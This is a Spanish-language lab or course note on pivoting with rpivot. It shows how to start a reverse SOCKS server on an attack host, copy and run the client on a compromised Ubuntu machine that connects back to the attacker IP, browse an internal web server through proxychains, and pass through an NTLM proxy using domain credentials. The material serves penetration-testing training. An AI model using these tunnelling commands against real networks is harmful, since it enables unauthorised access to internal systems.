[Rpivot](https://github.com/klsecservices/rpivot) es una herramienta de proxy SOCKS inverso escrita en Python para tunelización SOCKS. Rpivot vincula una máquina dentro de una red corporativa a un servidor externo y expone el puerto local del cliente en el lado del servidor. Tomaremos el siguiente escenario, donde tenemos un servidor web en nuestra red interna (172.16.5.135) y queremos acceder a él usando el proxy rpivot.

![[rpivot.png | 1000]]

Podemos comenzar nuestro servidor proxy SOCKS usando el siguiente comando para permitir al cliente conectarse en el puerto 9999 y escuchar en el puerto 9050 para conexiones pivote proxy.

```shell-session
git clone https://github.com/klsecservices/rpivot.git
```

> *Tener en cuenta que se necesita usar python2.7 para ejecutar correctamente `rpivot`*

Ahora podemos empezar el servidor proxy SOCKS para conectarnos a nuestro cliente en el servidor Ubuntu comprometido usando `server.py`

##### Corriendo server.py desde el host de atacante

```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Antes de ejecutar `client.py` tendremos que transferirlo al objetivo, usando `scp` por ejemplo.

```shell-session
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

Confirmamos que la conexión se ha establecido

```shell-session
New connection from host 10.129.202.64, source port 35226
```

Configuraremos **proxychains** para pivotar a través de nuestro servidor local en **127.0.0.1:9050** en nuestra máquina de ataque, que fue iniciado previamente por el servidor en Python.

Finalmente, deberíamos poder acceder al servidor web desde el lado del servidor, el cual está alojado en la red interna **172.16.5.0/23**, en la dirección **172.16.5.135:80**, utilizando **proxychains** y **Firefox**.

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

De forma similar al proxy de pivoting mencionado anteriormente, pueden darse escenarios en los que no sea posible pivotar directamente hacia un servidor externo (máquina de ataque) en la nube. Algunas organizaciones tienen configurado un proxy HTTP con autenticación **NTLM** asociada al **Controlador de Dominio**.

En estos casos, podemos proporcionar una opción adicional de autenticación NTLM a **rpivot** para autenticarnos a través del proxy NTLM, especificando un **nombre de usuario y una contraseña**. En estos escenarios, podríamos utilizar el script **client.py** de rpivot de la siguiente manera:

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

